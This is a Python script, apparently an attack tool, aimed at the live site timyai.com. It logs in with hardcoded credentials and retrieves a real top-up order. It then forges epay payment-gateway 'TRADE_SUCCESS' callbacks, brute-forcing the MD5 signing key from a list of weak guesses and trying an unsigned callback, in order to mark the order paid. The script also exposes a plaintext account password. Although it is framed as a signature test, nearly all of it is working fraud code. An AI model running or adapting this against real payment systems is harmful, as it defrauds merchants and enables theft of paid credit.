#!/usr/bin/env python3
import requests
import hashlib
import time

BASE_URL = "https://timyai.com"
TEST_USERNAME = "antplayer"
TEST_PASSWORD = "sjh@101709"
REAL_TRADE_NO = "USR20NO5FFXID1777806504"

def test_login():
    print("\n[1] 登录...")
    data = {"username": TEST_USERNAME, "password": TEST_PASSWORD}
    resp = requests.post(BASE_URL + "/api/user/login", json=data, timeout=10)
    result = resp.json()
    if result.get("success"):
        return result.get("data", {}).get("id"), resp.cookies.get("session")
    return None, None

def get_order_info(user_id, session):
    print("\n[2] 获取订单...")
    cookies = {"session": session}
    headers = {"New-Api-User": str(user_id)}
    resp = requests.get(BASE_URL + "/api/user/topup/self", 
                       cookies=cookies, headers=headers, timeout=10)
    result = resp.json()
    
    if result.get("success"):
        for item in result.get("data", {}).get("items", []):
            if item.get('trade_no') == REAL_TRADE_NO:
                print(f"✅ 订单: {item.get('trade_no')}, {item.get('money')}元, {item.get('payment_method')}")
                return item
    return None

# SDK签名算法
def generate_sign(params, key):
    """根据SDK代码生成签名"""
    # 1. 过滤: 删除sign, sign_type和空值
    filtered = {k: v for k, v in params.items() if k not in ['sign', 'sign_type'] and v}
    
    # 2. 排序: keys按字母排序
    sorted_keys = sorted(filtered.keys())
    
    # 3. 生成URL字符串
    url_string = '&'.join([f"{k}={filtered[k]}" for k in sorted_keys])
    
    # 4. MD5(URL字符串 + key)
    sign_source = url_string + key
    sign = hashlib.md5(sign_source.encode()).hexdigest()
    
    return sign, url_string

def test_with_correct_params(order):
    print("\n[3] 测试签名验证...")
    
    # 构造回调参数 (使用易支付网关会发送的参数名)
    callback_params = {
        "pid": "1378",
        "out_trade_no": order.get('trade_no'),  # 商家订单号
        "trade_status": "TRADE_SUCCESS",
        "trade_fee": str(order.get('money')),   # 注意是trade_fee不是money
        "type": order.get('payment_method'),     # alipay/wxpay
    }
    
    print(f"\n回调参数: {callback_params}")
    
    # 尝试常见密钥
    keys_to_try = [
        "test", "123456", "password", "key", "secret",
        "admin", "epay", "zhunfu", "1378", "timyai", "",
        "testkey", "123456789", "paykey", "mypay",
    ]
    
    url = BASE_URL + "/api/user/epay/notify"
    
    for key in keys_to_try:
        sign, url_string = generate_sign(callback_params.copy(), key)
        test_params = callback_params.copy()
        test_params['sign'] = sign
        
        try:
            resp = requests.post(url, data=test_params, timeout=10)
            
            if resp.text == "success":
                print(f"\n✅✅✅ 成功! 密钥: '{key}'")
                print(f"   URL字符串: {url_string}")
                print(f"   签名: {sign}")
                return True, key, sign
            else:
                print(f"  密钥'{key}': {resp.text[:20]}")
        except Exception as e:
            print(f"  密钥'{key}': 异常 {e}")
    
    # 尝试无签名
    print(f"\n尝试无签名...")
    try:
        resp = requests.post(url, data=callback_params, timeout=10)
        print(f"  结果: {resp.text}")
        if resp.text == "success":
            return True, None, None
    except Exception as e:
        print(f"  异常: {e}")
    
    return False, None, None

def test_with_money_param(order):
    """尝试用money参数代替trade_fee"""
    print("\n[4] 测试money参数...")
    
    callback_params = {
        "pid": "1378",
        "out_trade_no": order.get('trade_no'),
        "trade_status": "TRADE_SUCCESS",
        "money": str(order.get('money')),  # 用money
        "type": order.get('payment_method'),
    }
    
    print(f"参数: {callback_params}")
    
    url = BASE_URL + "/api/user/epay/notify"
    
    for key in ["test", "123456", "key", "secret", "epay", ""]:
        sign, url_string = generate_sign(callback_params.copy(), key)
        test_params = callback_params.copy()
        test_params['sign'] = sign
        
        try:
            resp = requests.post(url, data=test_params, timeout=10)
            
            if resp.text == "success":
                print(f"\n✅✅✅ money参数成功! 密钥: '{key}'")
                return True, key
        except:
            pass
    
    return False, None

def main():
    print("="*60)
    print("timyai.com 签名验证测试")
    print("="*60)
    
    user_id, session = test_login()
    if not user_id:
        return
    
    order = get_order_info(user_id, session)
    if not order:
        return
    
    success1, key1, sign1 = test_with_correct_params(order)
    
    if not success1:
        success2, key2 = test_with_money_param(order)
    
    print("\n" + "="*60)
    print("测试完成")
    print("="*60)

if __name__ == "__main__":
    main()
